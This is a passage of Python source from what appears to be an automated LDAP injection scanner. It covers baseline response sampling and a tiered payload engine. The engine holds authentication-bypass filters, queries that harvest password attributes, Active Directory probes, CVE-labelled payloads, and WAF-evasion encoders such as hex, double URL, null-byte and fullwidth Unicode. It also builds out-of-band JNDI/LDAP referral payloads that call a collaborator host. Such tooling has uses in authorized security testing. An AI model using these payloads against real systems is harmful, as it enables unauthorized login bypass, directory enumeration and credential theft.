        
        mean = sum(clean) / len(clean)
        if mean < 1:
            return VolatilityClass.STATIC
            
        std = statistics.stdev(clean) if len(clean) > 1 else 0
        cv  = std / max(mean, 1)
        
        if cv < 0.05:  return VolatilityClass.STATIC
        if cv < 0.25:  return VolatilityClass.UNSTABLE
        return VolatilityClass.HIGHLY_DYNAMIC

    @staticmethod
    def calibrate_thresholds(
        vol: VolatilityClass
    ) -> Tuple[float, float]:
        """
        Returns (diff_threshold, bool_threshold) calibrated to volatility (v3.0).
        diff_threshold: minimum sim_delta to count as structural change.
        bool_threshold: minimum TRUE/FALSE delta for boolean oracle.
        """
        if vol == VolatilityClass.STATIC:
            return 0.08, 0.10      # was 0.05, 0.08
        elif vol == VolatilityClass.UNSTABLE:
            return 0.12, 0.18      # was 0.10, 0.15
        else:
            return 0.30, 0.38      # was 0.25, 0.30


class BaselineCollector:
    """
    Collects baseline responses for an endpoint.
    Adaptive sample count based on coefficient of variation.
    Populates deterministic replay_params for verification consistency.
    """

    # Sample counts per volatility stage
    _SAMPLES_INITIAL  = 4
    _SAMPLES_UNSTABLE = 8
    _SAMPLES_HIGH_DYN = 14

    _RATELIMIT_RE = re.compile(
        r"rate\s*limit|too\s*many\s*requests|slow\s*down|throttl", re.I)

    def __init__(self, client: HTTPClient, cfg: ScanConfig):
        self._client = client
        self._cfg    = cfg

    def _collect_batch(self, ep: Endpoint,
                       n: int) -> Tuple[
        List[float], List[int], List[requests.Response]
    ]:
        """Collect n samples with randomized safe values (v3.0)."""
        timings:   List[float] = []
        lengths:   List[int]   = []
        resps:     List[requests.Response] = []
        for _ in range(n):
            data = build_safe_data(ep.params, randomize=True)
            start = time.monotonic()
            resp = self._client.send_endpoint(
                ep, data, phase="discovery")
            elapsed = time.monotonic() - start
            if resp is not None:
                # Rate-limit detection
                if resp.status_code == 429 or self._RATELIMIT_RE.search(resp.text or ""):
                    warn(f"  Rate limit detected during baseline for {ep.url}")
                    time.sleep(2.0)
                    continue
                timings.append(elapsed)
                lengths.append(len(resp.text or ""))
                resps.append(resp)
            time.sleep(0.08)
        return timings, lengths, resps

    def collect(self, ep: Endpoint) -> Optional[Baseline]:
        """
        Collect baseline for one endpoint+auth_state (v3.0).
        Returns None if endpoint unreachable.
        """
        # Initial batch
        timings, lengths, resps = self._collect_batch(
            ep, self._SAMPLES_INITIAL)
        if not resps:
            return None

        # Determine volatility from initial samples
        vol = VolatilityClassifier.classify(lengths)

        if vol == VolatilityClass.UNSTABLE:
            t2, l2, r2 = self._collect_batch(ep, 4)
            timings += t2; lengths += l2; resps += r2
        elif vol == VolatilityClass.HIGHLY_DYNAMIC:
            t3, l3, r3 = self._collect_batch(ep, 10)
            timings += t3; lengths += l3; resps += r3
            warn(f"  Baseline: highly dynamic — "
                 f"{ep.url} boolean diff disabled")

        if not resps: return None

        # Select median-length response as canonical (v3.0)
        median_len = sorted(lengths)[len(lengths) // 2]
        last = min(resps, key=lambda r: abs(len(r.text or "") - median_len))
        
        diff_thr, bool_thr = VolatilityClassifier.calibrate_thresholds(vol)
        body     = last.text or ""
        len_var  = (statistics.variance(lengths)
                    if len(lengths) >= 2 else 0.0)

        # Build deterministic replay_params (never changes)
        replay   = build_safe_data(ep.params, randomize=False)

        # Extract default form values for consistent non-target params
        defaults: Dict[str, str] = {}
        if _BS4_OK:
            try:
                soup = BeautifulSoup(body, "html.parser")
                for inp in soup.find_all(["input","select"]):
                    n = inp.get("name","")
                    if n and n in ep.params:
                        defaults[n] = inp.get("value","") or ""
            except Exception:
                pass
        # Fall back to replay_params for missing keys
        for p in ep.params:
            if p not in defaults:
                defaults[p] = replay.get(p, "")

        # Cache on endpoint for injection_data consistency
        if not ep.default_params:
            ep.default_params = defaults

        bl = Baseline(
            status         = last.status_code,
            body           = body,
            body_len       = len(body),
            body_hash      = _body_hash(body),
            norm_body_hash = _norm_body_hash(body),
            has_form       = bool(
                re.search(r"<form[\s>]", body, re.I)),
            final_url      = last.url,
            cookies        = {c.name for c in last.cookies},
            response_class = classify_baseline_response(last),
            volatility     = vol,
            samples        = timings,
            len_samples    = lengths,
            len_variance   = len_var,
            unstable       = (vol != VolatilityClass.STATIC),
            highly_dynamic = (vol == VolatilityClass.HIGHLY_DYNAMIC),
            replay_params  = replay,
            diff_threshold = diff_thr,
            bool_threshold = bool_thr,
            headers        = dict(last.headers),
        )

        # V7 FIX: Baseline sanity check — verify safe value didn't accidentally
        # match a real LDAP entry (would poison baseline with auth-success state).
        # If baseline body looks like auth-success, re-sample with a different suffix.
        if (AUTH_SUCCESS_HIGH_RE.search(body)
                and not AUTH_FAIL_RE.search(body)
                and ep.is_auth_ep):
            warn(f"  Baseline WARNING: {ep.url} safe-value produced auth-success response — "
                 f"baseline may be poisoned. Re-sampling with unique suffix.")
            # Try up to 3 alternative suffixes
            for attempt in range(3):
                alt_suffix = uuid.uuid4().hex[:8]
                alt_data   = {p: safe_val(p, alt_suffix) for p in ep.params}
                alt_resp   = self._client.send_endpoint(ep, alt_data, phase="discovery")
                if alt_resp and not AUTH_SUCCESS_HIGH_RE.search(alt_resp.text or ""):
                    # Good — use this body as the canonical baseline
                    bl.body           = alt_resp.text or ""
                    bl.body_len       = len(bl.body)
                    bl.body_hash      = _body_hash(bl.body)
                    bl.norm_body_hash = _norm_body_hash(bl.body)
                    bl.response_class = classify_baseline_response(alt_resp)
                    bl.replay_params  = alt_data
                    ok(f"  Baseline re-sampled (attempt {attempt+1}) — clean baseline acquired")
                    break
            else:
                warn(f"  Baseline: could not get clean non-auth baseline for {ep.url} — "
                     f"LDAP prob downgraded")
                # Don't skip — just mark as unreliable so pipeline applies extra scrutiny

        verbose(f"  Baseline: {ep.url} "
                f"[{ep.auth_state.value}] "
                f"class={bl.response_class} "
                f"vol={vol.value} "
                f"len={bl.body_len}")
        return bl

    def collect_parallel(
        self,
        eps: List[Endpoint],
        max_workers: int = 4
    ) -> Dict[str, Baseline]:
        """Collect baselines for all endpoints in parallel."""
        results: Dict[str, Baseline] = {}
        lock    = threading.Lock()

        def _job(ep: Endpoint) -> None:
            bl = self.collect(ep)
            if bl is not None:
                with lock:
                    results[ep.key] = bl

        with ThreadPoolExecutor(
            max_workers=max_workers,
            thread_name_prefix="baseline"
        ) as pool:
            futs = [pool.submit(_job, ep) for ep in eps]
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as exc:
                    verbose(f"  Baseline error: {exc}")

        info(f"  Baselines collected: "
             f"{len(results)}/{len(eps)}")
        return results

# ═══════════════════════════════════════════════════════════════════════════════
# §14  PAYLOAD ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadEngine:
    """
    Tier-structured LDAP injection payload generator.

    Tier 0 — 3 probes  — always run, free from injection budget
    Tier 1 — 8 payloads — runs when Tier 0 signals
    Tier 2 — 6 payloads — boolean oracle confirmation
    Tier 3 — dynamic   — WAF bypass variants from successful T1 payload
    Tier 4 — 3 payloads — OOB (collab host required)

    CVEPayloadBank trimmed to 15 payloads where the vulnerability
    pattern is detectable from HTTP responses.
    """

    @dataclass
    class Mutator:
        """
        Helper for obfuscating and mutating LDAP payloads.
        Useful for bypassing WAFs and filters.
        """
        @staticmethod
        def url_encode(text: str) -> str:
            return quote(text)

        @staticmethod
        def double_url_encode(text: str) -> str:
            return quote(quote(text))

        @staticmethod
        def hex_encode(text: str) -> str:
            return "".join(f"\\{ord(c):02x}" for c in text)

        @staticmethod
        def hex_upper_encode(text: str) -> str:
            """Bypass some filters requiring uppercase hex (v3.0)."""
            return "".join(f"\\{ord(c):02X}" for c in text)

        @staticmethod
        def null_middle_encode(text: str) -> str:
            """Insert null byte in middle of string (v3.0)."""
            if not text: return text
            mid = len(text) // 2
            return text[:mid] + "\x00" + text[mid:]

        @staticmethod
        def html_entity_encode(text: str) -> str:
            """Bypass some web-level filters that decode HTML entities (v3.0)."""
            return "".join(f"&#{ord(c)};" for c in text)

        @staticmethod
        def char_encode(text: str) -> str:
            # Replace structural chars with hex equivalents
            rep = {
                "*": "\\2a", "(": "\\28", ")": "\\29",
                "&": "\\26", "|": "\\7c", "=": "\\3d",
                "\\": "\\5c", "\x00": "\\00", "/": "\\2f",
                ":": "\\3a", " ": "\\20",
            }
            return "".join(rep.get(c, c) for c in text)

        @staticmethod
        def case_mutate(text: str) -> str:
            # Modifies case of word-like segments (common in LDAP attributes)
            def repl(m):
                s = m.group(0)
                if random.random() > 0.5:
                    return s.upper()
                return s.lower()
            return re.sub(r'[a-zA-Z]{3,}', repl, text)

        @staticmethod
        def null_truncate(text: str) -> str:
            return text + "\x00"

        @staticmethod
        def null_byte_encode(text: str) -> str:
            return text + "%00"

        @staticmethod
        def double_url_structural(text: str) -> str:
            """Double encode only structural LDAP characters (v3.0)."""
            rep = {"*": "%252a", "(": "%2528", ")": "%2529", "&": "%2526", "|": "%257c", "=": "%253d"}
            return "".join(rep.get(c, c) for c in text)

        @staticmethod
        def unicode_fullwidth(text: str) -> str:
            """Bypass some filters by using fullwidth Unicode (v3.0)."""
            return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in text)

    P = Payload  # alias

    # ── Tier 0: Always-run qualifying probes ─────────────────────────────────

    TIER0_PROBES = [
        Payload("*",            "T0: wildcard probe",
                "wildcard",     PayloadTier.TIER0_PROBE,  10),
        Payload(")",            "T0: paren syntax probe",
                "syntax",       PayloadTier.TIER0_PROBE,  9),
        Payload(")(uid=*)(x=",  "T0: structural inject probe",
                "structural",   PayloadTier.TIER0_PROBE,  8),
    ]

    # ── Tier 1: Core high-signal payloads ────────────────────────────────────

    TIER1_CORE = [
        Payload("*)(uid=*))",             "T1: uid auth bypass",
                "auth_bypass",  PayloadTier.TIER1_CORE,   10, "any"),
        Payload("*(|(objectClass=*))",    "T1: always-true objectClass",
                "bool_true",    PayloadTier.TIER1_CORE,   10, "any"),
        Payload("admin)(|(a=b))",         "T1: admin always-true OR",
                "auth_bypass",  PayloadTier.TIER1_CORE,   9,  "login"),
        Payload("*)(|(uid=*)(cn=*))",     "T1: OR chain bypass",
                "or_chain",     PayloadTier.TIER1_CORE,   9,  "any"),
        Payload(")(uid=*))(|(uid=",       "T1: double inject probe",
                "structural",   PayloadTier.TIER1_CORE,   8,  "any"),
        Payload("admin\x00",              "T1: null byte truncation",
                "null_byte",    PayloadTier.TIER1_CORE,   8,  "any"),
        Payload("%2a%29%28uid%3d%2a%29%29","T1: URL-enc bypass",
                "url_encoded",  PayloadTier.TIER1_CORE,   7,  "any",
                encoded_already=True),
        Payload("*)(|(sAMAccountName=*))", "T1: AD sAM bypass",
                "ad_bypass",    PayloadTier.TIER1_CORE,   9,
                "any", "ad"),
        # New: Attribute Injection (CNES-style)
        Payload("mail=*)(mail=*",          "T1: attribute injection",
                "attr_inject",  PayloadTier.TIER1_CORE,   8,  "any"),
        # New: DN Injection
        Payload("cn=admin,dc=*",          "T1: DN injection",
                "dn_inject",    PayloadTier.TIER1_CORE,   8,  "any"),
        # Wave 3: AD OID Payload Expansion (§11.1)
        Payload("admin)(sAMAccountName:1.2.840.113556.1.4.803:=512)", 
                "T1-AD: OID Bitwise AND (v3.0)",
                "ad_bypass",    PayloadTier.TIER1_CORE,   9,  "any", "ad"),
        Payload("admin)(givenName:1.2.840.113556.1.4.1941:=admin)",
                "T1-AD: OID Rule-In-Chain (v3.0)",
                "ad_bypass",    PayloadTier.TIER1_CORE,   9,  "any", "ad"),
        Payload("admin)(userAccountControl:1.2.840.113556.1.4.803:=2)",
                "T1-AD: OID UAC Disabled (v3.0)",
                "ad_bypass",    PayloadTier.TIER1_CORE,   8,  "any", "ad"),
        # Wave 3: Sensitive Attribute Harvesting (§11.2)
        Payload("*)(|(userPassword=*)(unicodePwd=*)(shadowPassword=*)(shadowLastChange=*))",
                "T1: Attr Enum (Auth/Audit) (v3.0)",
                "attr_harvest", PayloadTier.TIER1_CORE,   9,  "any"),
        Payload("*)(|(unixHomeDirectory=*)(homeDirectory=*)(scriptPath=*))",
                "T1: Attr Enum (System) (v3.0)",
                "attr_harvest", PayloadTier.TIER1_CORE,   9,  "any"),
        Payload("*)(|(description=*)(info=*)(comment=*)(notes=*))",
                "T1: Attr Enum (Leaked Info) (v3.0)",
                "attr_harvest", PayloadTier.TIER1_CORE,   7,  "any"),
        # Wave 3: Oracle Directory Server (ODS) specific (§11.3) (Fix 9)
        Payload("*(|(orclguid=*))",        "T1-ODS: orclguid probe",
                "ods_enum",     PayloadTier.TIER1_CORE,   8,  "any"),
        Payload("*(|(orclNetDescString=*))", "T1-ODS: NetDesc probe",
                "ods_enum",     PayloadTier.TIER1_CORE,   8,  "any"),
    ]

    # ── Tier 1 server-specific additions ─────────────────────────────────────

    TIER1_AD = [
        Payload("*(|(sAMAccountName=Administrator))",
                "T1-AD: admin sAM probe",
                "ad_enum",      PayloadTier.TIER1_CORE,   8,
                "any", "ad"),
        Payload("*(|(userPrincipalName=*))",
                "T1-AD: UPN wildcard",
                "ad_bypass",    PayloadTier.TIER1_CORE,   8,
                "any", "ad"),
    ]

    TIER1_OPENLDAP = [
        Payload("*(|(uid=*))",            "T1-OL: uid wildcard",
                "ol_bypass",    PayloadTier.TIER1_CORE,   9,
                "any", "openldap"),
        Payload("*(|(uidNumber=0))",      "T1-OL: root uid",
                "ol_enum",      PayloadTier.TIER1_CORE,   8,
                "any", "openldap"),
    ]

    # ── Framework-specific Tier 1 ─────────────────────────────────────────────

    TIER1_SPRING = [
        Payload("*)(|(cn=*)(uid=*))",     "T1-Spring: template bypass",
                "spring_ldap",  PayloadTier.TIER1_CORE,   9,
                "login"),
        Payload("admin)(|(cn=Admin*)(",   "T1-Spring: Security bypass",
                "spring_ldap",  PayloadTier.TIER1_CORE,   9,
                "login"),
    ]

    TIER1_SHIRO = [
        Payload("*)(uid=*)(",             "T1-Shiro: realm bypass",
                "shiro_ldap",   PayloadTier.TIER1_CORE,   10,
                "login"),
    ]

    TIER1_ASPNET = [
        Payload("admin)(&(objectClass=*))", "T1-ADSI: AND short-circuit",
                "adsi_bypass",  PayloadTier.TIER1_CORE,   9,
                "login"),
    ]

    # ── Tier 2: Boolean oracle confirmation ───────────────────────────────────

    TIER2_BOOLEAN = [
        Payload("*(|(uid=a*))",           "T2: TRUE uid prefix-a",
                "bool_true",    PayloadTier.TIER2_BOOLEAN, 8),
        Payload("*(|(uid=ZZZQQQXXX99z*))", "T2: FALSE uid impossible",
                "bool_false",   PayloadTier.TIER2_BOOLEAN, 8),
        Payload("*(|(objectClass=person))","T2: TRUE objectClass person",
                "bool_true",    PayloadTier.TIER2_BOOLEAN, 7),
        Payload("*(|(objectClass=ZZZZFAKE))","T2: FALSE objectClass fake",
                "bool_false",   PayloadTier.TIER2_BOOLEAN, 7),
        Payload("*(!(uid=ZZZQQQXXX99z))", "T2: NOT-false = always-true",
                "bool_true",    PayloadTier.TIER2_BOOLEAN, 7),
        Payload("*(|(uid=admin))",        "T2: uid=admin existence check",
                "bool_enum",    PayloadTier.TIER2_BOOLEAN, 6),
    ]

    # ── CVE Payload Bank (trimmed — HTTP-detectable only) ────────────────────

    CVE_PAYLOADS = [
        # Shiro CVE-2016-4437
        Payload("*)(uid=*)(",
                "CVE-2016-4437: Shiro realm",
                "cve_shiro",    PayloadTier.TIER1_CORE,   10, "login"),
        # Spring CVE-2019-3778
        Payload("*)(|(sAMAccountName=*))",
                "CVE-2019-3778: Spring LDAP",
                "cve_spring",   PayloadTier.TIER1_CORE,   10, "login"),
        # OpenLDAP null byte CVE-2009-1184
        Payload("admin\x00",
                "CVE-2009-1184: null-byte trunc",
                "cve_null",     PayloadTier.TIER1_CORE,   9, "any"),
        # ldap3 empty bind CVE-2021-33880
        Payload("",
                "CVE-2021-33880: ldap3 empty bind",
                "cve_ldap3",    PayloadTier.TIER1_CORE,   10, "login"),
        Payload(" ",
                "CVE-2021-33880: ldap3 space bind",
                "cve_ldap3",    PayloadTier.TIER1_CORE,   9,  "login"),
        # JNDI LDAP CVE-2021-44228 (Log4Shell surface)
        Payload("${jndi:ldap://oob.placeholder/a}",
                "CVE-2021-44228: Log4Shell JNDI",
                "cve_log4shell",PayloadTier.TIER4_OOB,    8,  "any"),
        # NSS CVE-2008-5500
        Payload("*)(|(uid=*)(",
                "CVE-2008-5500: NSS LDAP bypass",
                "cve_nss",      PayloadTier.TIER1_CORE,   9,  "any"),
        # AD noPac CVE-2021-42287
        Payload("*(|(sAMAccountName=DC$*))",
                "CVE-2021-42287: noPac probe",
                "cve_nopac",    PayloadTier.TIER1_CORE,   8,
                "any", "ad"),
        # JNDI JBoss CVE-2010-3700
        Payload(")(|(objectClass=*)(\x00",
                "CVE-2010-3700: JNDI inject",
                "cve_jboss",    PayloadTier.TIER1_CORE,   8,  "any"),
        # ManageEngine CVE-2022-47966
        Payload("*)(|(uid=*)(cn=*)(mail=*))",
                "CVE-2022-47966: ManageEngine OR",
                "cve_manage",   PayloadTier.TIER1_CORE,   8,  "any"),
        # VMware CVE-2021-22057
        Payload("admin)(|(objectClass=*)(",
                "CVE-2021-22057: VMware Workspace",
                "cve_vmware",   PayloadTier.TIER1_CORE,   8,  "login"),
        # Cisco ISE CVE-2022-20822
        Payload("*(|(uid=admin)(uid=administrator))",
                "CVE-2022-20822: Cisco ISE",
                "cve_cisco",    PayloadTier.TIER1_CORE,   8,  "any"),
        # Openfire CVE-2023-32315
        Payload(")(|(cn=admin)(",
                "CVE-2023-32315: Openfire bypass",
                "cve_openfire", PayloadTier.TIER1_CORE,   9,  "login"),
        # Citrix CVE-2023-3519
        Payload("*)(|(sAMAccountName=*)(uid=*))",
                "CVE-2023-3519: Citrix ADC",
                "cve_citrix",   PayloadTier.TIER1_CORE,   8,  "any"),
        # Confluence CVE-2022-26134 variant
        Payload("*)(|(cn=confluence*)(uid=*)",
                "CVE-2022-26134: Confluence LDAP",
                "cve_confluence",PayloadTier.TIER1_CORE,  7,  "any"),
    ]

    @classmethod
    def build_tier5_mutated(cls, base_payloads: List[Payload]) -> List[Payload]:
        """
        Takes successful or high-conf payloads and generates mutated variants.
        """
        mutated: List[Payload] = []
        for p in base_payloads:
            # Skip Tier 0 probes or structural probes for mutation if needed, 
            # but usually we want to mutate everything that might work.
            
            # 1. Hex encoding
            mutated.append(cls.P(
                cls.Mutator.hex_encode(p.raw),
                f"T5: hex-encoded {p.desc}",
                f"{p.technique}_hex", PayloadTier.TIER5_MUTATION, p.priority - 1
            ))
            # 2. Char encoding (structural only)
            mutated.append(cls.P(
                cls.Mutator.char_encode(p.raw),
                f"T5: char-encoded {p.desc}",
                f"{p.technique}_enc", PayloadTier.TIER5_MUTATION, p.priority - 1
            ))
            # 3. Double URL encoding
            if not p.encoded_already:
                mutated.append(cls.P(
                    cls.Mutator.double_url_encode(p.raw),
                    f"T5: dbl-url-encoded {p.desc}",
                    f"{p.technique}_denc", PayloadTier.TIER5_MUTATION, p.priority - 2
                ))
            # 4. Null byte truncation (if not already present)
            if "\x00" not in p.raw:
                mutated.append(cls.P(
                    cls.Mutator.null_truncate(p.raw),
                    f"T5: null-truncated {p.desc}",
                    f"{p.technique}_null", PayloadTier.TIER5_MUTATION, p.priority - 1
                ))
            # 5. Case mutation
            mut_case = cls.Mutator.case_mutate(p.raw)
            if mut_case != p.raw:
                mutated.append(cls.P(
                    mut_case,
                    f"T5: case-mutated {p.desc}",
                    f"{p.technique}_case", PayloadTier.TIER5_MUTATION, p.priority - 2
                ))
            # 6. HTML entity encoding
            mutated.append(cls.P(
                cls.Mutator.html_entity_encode(p.raw),
                f"T5: html-ent {p.desc}",
                f"{p.technique}_hent", PayloadTier.TIER5_MUTATION, p.priority - 2
            ))
            # 7. Null-byte middle insertion
            if len(p.raw) > 2 and "\x00" not in p.raw:
                mutated.append(cls.P(
                    cls.Mutator.null_middle_encode(p.raw),
                    f"T5: null-mid {p.desc}",
                    f"{p.technique}_nmid", PayloadTier.TIER5_MUTATION, p.priority - 2
                ))
            # 8. Unicode Fullwidth (v3.0)
            mutated.append(cls.P(
                cls.Mutator.unicode_fullwidth(p.raw),
                f"T5: unicode-fw {p.desc}",
                f"{p.technique}_ufw", PayloadTier.TIER5_MUTATION, p.priority - 2
            ))
            # 9. Double URL Structural (v3.0)
            mutated.append(cls.P(
                cls.Mutator.double_url_structural(p.raw),
                f"T5: dbl-url-struct {p.desc}",
                f"{p.technique}_dstruct", PayloadTier.TIER5_MUTATION, p.priority - 2
            ))
        return mutated

    @classmethod
    def build_dn_injection(cls, domain: str) -> List[Payload]:
        """Wave 3: Dynamic DN injection factory based on target domain apex (§12)."""
        dc_str = domain_to_dc(domain) # e.g., dc=example,dc=com
        
        payloads = [
            Payload(f"*,{dc_str}", "T1: Apex Wildcard DN", "dn_inject", PayloadTier.TIER1_CORE, 6),
            # AD UPN Format
            Payload(f"Administrator@{domain}", "T1-AD: UPN DN", "dn_inject", PayloadTier.TIER1_CORE, 8, "login", "ad"),
            # NTLM Format
            Payload(f"{domain.split('.')[0]}\\Administrator", "T1-AD: NTLM DN", "dn_inject", PayloadTier.TIER1_CORE, 8, "login", "ad"),
        ]
        
        # Build common OU paths
        for ou in ["Users", "Admins", "Accounts", "Corporate"]:
            payloads.append(Payload(
                f"cn=admin,ou={ou},{dc_str}", 
                f"T1: Full path DN ({ou})", 
                "dn_inject", PayloadTier.TIER1_CORE, 7
            ))
            
        return payloads

    # ── WAF Bypass Encoding Functions ────────────────────────────────────────

    _ENCODINGS = [
        ("url",        lambda s: quote(s, safe="")),
        ("double_url", lambda s: quote(quote(s, safe=""), safe="")),
        ("hex",        lambda s: "".join(f"\\{ord(c):02x}" for c in s)),
        ("unicode_fw", lambda s: "".join(
            chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c
            for c in s)),
        ("tab_space",  lambda s: re.sub(
            r"([a-zA-Z]+)(=)", r"\1\t=", s, count=1)),
    ]

    @classmethod
    def _payload_ok(cls, raw: str,
                    survived: Set[str]) -> bool:
        """Check if payload's special chars survived WAF."""
        specials = {c for c in raw if c in LDAP_METACHAR_SET}
        return specials.issubset(survived) if specials else True

    @classmethod
    def build_tier0(cls) -> List[Payload]:
        """Tier 0 probes — always run, 3 payloads."""
        return list(cls.TIER0_PROBES)

    @classmethod
    def build_tier1(cls,
                    server_type: str = "generic",
                    framework: str   = "generic",
                    context: str     = "any",
                    survived: Optional[Set[str]] = None,
                    failed: Optional[Set[str]]   = None,
                    include_cve: bool = True,
                    limit: int = 8
                    ) -> List[Payload]:
        """
        Build Tier 1 payload list.
        Filtered by server type, framework, context, WAF survival.
        """
        survived = survived or set(LDAP_METACHAR_SET)
        failed   = failed   or set()

        payloads: List[Payload] = []

        # Base Tier 1
        payloads.extend(cls.TIER1_CORE)

        # Server-specific additions
        if server_type in ("ad", "activedirectory"):
            payloads.extend(cls.TIER1_AD)
        elif server_type in ("openldap", "389ds"):
            payloads.extend(cls.TIER1_OPENLDAP)

        # Framework-specific additions
        if framework == "spring":
            payloads.extend(cls.TIER1_SPRING)
        elif framework == "shiro":
            payloads.extend(cls.TIER1_SHIRO)
        elif framework == "aspnet":
            payloads.extend(cls.TIER1_ASPNET)

        # CVE bank
        if include_cve:
            cve_payloads = [
                p for p in cls.CVE_PAYLOADS
                if p.tier == PayloadTier.TIER1_CORE
            ]
            payloads.extend(cve_payloads)

        # Filter by context
        payloads = [
            p for p in payloads
            if p.context in ("any", context)
        ]

        # Filter by server
        payloads = [
            p for p in payloads
            if p.server in ("any", server_type, "generic")
        ]

        # Filter by WAF survival
        payloads = [
            p for p in payloads
            if cls._payload_ok(p.raw, survived)
        ]

        # Remove known failures
        payloads = [p for p in payloads
                    if p.raw not in failed]

        # Deduplicate
        seen: Set[str] = set()
        unique: List[Payload] = []
        for p in payloads:
            if p.raw not in seen:
                seen.add(p.raw)
                unique.append(p)

        # Sort by priority
        unique.sort(key=lambda p: -p.priority)
        return unique[:8]  # Hard cap at 8 for Tier 1

    @classmethod
    def build_tier2(cls,
                    context: str = "any",
                    survived: Optional[Set[str]] = None
                    ) -> List[Payload]:
        """Tier 2 boolean oracle payloads."""
        survived = survived or set(LDAP_METACHAR_SET)
        return [
            p for p in cls.TIER2_BOOLEAN
            if cls._payload_ok(p.raw, survived)
        ]

    @classmethod
    def build_tier3_waf(cls,
                         trigger_payload: Payload,
                         survived: Set[str]
                         ) -> List[Payload]:
        """
        Generate WAF bypass variants from the payload that triggered a signal.
        Only called when WAF is detected and signal needs confirmation.
        Max 4 variants.
        """
        raw      = trigger_payload.raw
        variants: List[Payload] = []
        for enc_name, enc_fn in cls._ENCODINGS:
            try:
                encoded  = enc_fn(raw)
                specials = {
                    c for c in encoded
                    if c in LDAP_METACHAR_SET
                }
                if specials.issubset(survived) and encoded != raw:
                    variants.append(Payload(
                        raw=encoded,
                        desc=f"T3-WAF [{enc_name}]: "
                             f"{trigger_payload.desc}",
                        technique=f"waf_{enc_name}",
                        tier=PayloadTier.TIER3_WAF,
                        priority=trigger_payload.priority - 1,
                    ))
            except Exception:
                pass
        return variants[:4]

    @classmethod
    def build_tier4_oob(cls,
                         collab_host: str,
                         scan_id: str) -> List[Payload]:
        """OOB payloads — only when collab host configured."""
        if not collab_host:
            return []
        host = collab_host.strip().rstrip("/")
        uid  = scan_id[:8]
        raw_list = [
            (f")(|(objectClass=ldap://{host}/{uid}))",
             "T4-OOB: filter-embedded referral"),
            (f"${{jndi:ldap://{host}/{uid}}}",
             "T4-OOB: JNDI LDAP (Java backends)"),
            (f"*)(|(ref=ldap://{host}/))",
             "T4-OOB: ref attribute referral"),
        ]
        return [
            Payload(raw=r, desc=d,
                    technique="oob_referral",
                    tier=PayloadTier.TIER4_OOB,
                    priority=9)
            for r, d in raw_list
        ]

    @classmethod
    def build_tier6_second_order(cls, uid: str) -> List[Payload]:
        """Probes for second-order reflections."""
        marker = f"HELLHOUND_{uid}"
        return [
            Payload(marker, "T6: second-order reflection marker",
                    "second_order", PayloadTier.TIER6_SECOND_ORDER, 10),
            Payload(f"{marker}*)(uid=*", "T6: second-order break-out probe",
                    "second_order", PayloadTier.TIER6_SECOND_ORDER, 9),
        ]


# ── Learning Memory ───────────────────────────────────────────────────────────

class LearningMemory:
    """
    Per-scan EMA-scored payload performance tracking.
    Feeds payload ordering for later endpoints in the scan queue.
    Wave 4: Path-scoped EMA ensures high-performance payloads in one path 
    don't skew the budget in unrelated paths (§7.3).
    """

    _DECAY = 0.85

    def __init__(self):
        # keyed by path prefix (scope)
        self._ema:      Dict[str, Dict[str, float]] = { "global": {} }
        self._failed:   Dict[str, Set[str]]         = { "global": set() }
        self._success:  Dict[str, Set[str]]         = { "global": set() }
        self._attempts: Dict[str, Dict[str, int]]   = { "global": {} }
        self._lock      = threading.Lock()

    def _get_scope(self, url: str) -> str:
        """Wave 4: Determine path scope from URL (§7.3)."""
        p = urlparse(url).path.rstrip('/')
        if not p: return "/"
        # Group by first two path segments for meaningful scoping
        segs = p.split('/')[:3]
        return "/".join(segs)

    def mark_success(self, url: str, raw: str) -> None:
        scope = self._get_scope(url)
        with self._lock:
            for s in [scope, "global"]:
                self._success.setdefault(s, set()).add(raw)
                ema_map = self._ema.setdefault(s, {})
                attempts = self._attempts.setdefault(s, {})
                prev = ema_map.get(raw, 0.5)
                ema_map[raw] = self._DECAY * prev + (1 - self._DECAY)
                attempts[raw] = attempts.get(raw, 0) + 1

    def mark_failure(self, url: str, raw: str) -> None:
        scope = self._get_scope(url)
        with self._lock:
            for s in [scope, "global"]:
                ema_map = self._ema.setdefault(s, {})
                attempts = self._attempts.setdefault(s, {})
                prev = ema_map.get(raw, 0.5)
                ema_map[raw] = self._DECAY * prev
                attempts[raw] = attempts.get(raw, 0) + 1

    def mark_blocked(self, raw: str) -> None:
        """WAF blocks remain global for safety."""
        with self._lock:
            self._failed["global"].add(raw)

    def should_skip(self, raw: str) -> bool:
        with self._lock:
            return raw in self._failed["global"]

    def ema_score(self, url: str, raw: str) -> float:
        scope = self._get_scope(url)
        with self._lock:
            # Prefer path-specific score, fall back to global
            if scope in self._ema and raw in self._ema[scope]:
                return self._ema[scope][raw]
            return self._ema["global"].get(raw, 0.5)

    def sort_by_score(self, url: str, payloads: List[Payload]) -> List[Payload]:
        scope = self._get_scope(url)
        with self._lock:
            scores = self._ema.get(scope, self._ema["global"])
        return sorted(
            payloads,
            key=lambda p: (-scores.get(p.raw, self._ema["global"].get(p.raw, 0.5)), -p.priority)
        )

    @property
    def failed_payloads(self) -> Set[str]:
        with self._lock:
            return set(self._failed["global"])

    def stats(self) -> Dict[str, Any]:
        with self._lock:
            top = sorted(
                self._ema["global"].items(),
                key=lambda x: x[1], reverse=True
            )[:5]
            return {
                "tracked_paths": len(self._ema),
                "success_total": len(self._success["global"]),
                "failed_global": len(self._failed["global"]),
                "top_ema":  [(r[:40], f"{s:.2f}")
                             for r, s in top],
            }
# ═══════════════════════════════════════════════════════════════════════════════
# §15  PHASE 5 — DETECTION PIPELINE
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class DetectionResult:
    """Result from the full detection pipeline for one injection."""
    fired:       bool
    score:       float
    signals:     List[DetectionSignal]
    severity:    Severity
    evidence:    str
    has_auth_bypass: bool = False
    has_error:       bool = False
    response_class:  str  = ResponseClass.STATIC.value
    non_destructive_confirmed: bool = True   # ← C1.1: Added for destructiveness tracking
    second_order:            bool  = False   # ← C1.1: Added for second-order detection


class DetectionPipeline:
    """
    Runs all 8 detectors in priority order against an injected response.
    Short-circuits on class transition (deterministic proof).
    Returns aggregated DetectionResult.
    """

    def __init__(self, cfg: ScanConfig):
        self._cfg = cfg

    # ── Detector 1: Class Transition (CRITICAL priority) ─────────────────────

    def _d1_class_transition(
        self,
        resp: requests.Response,
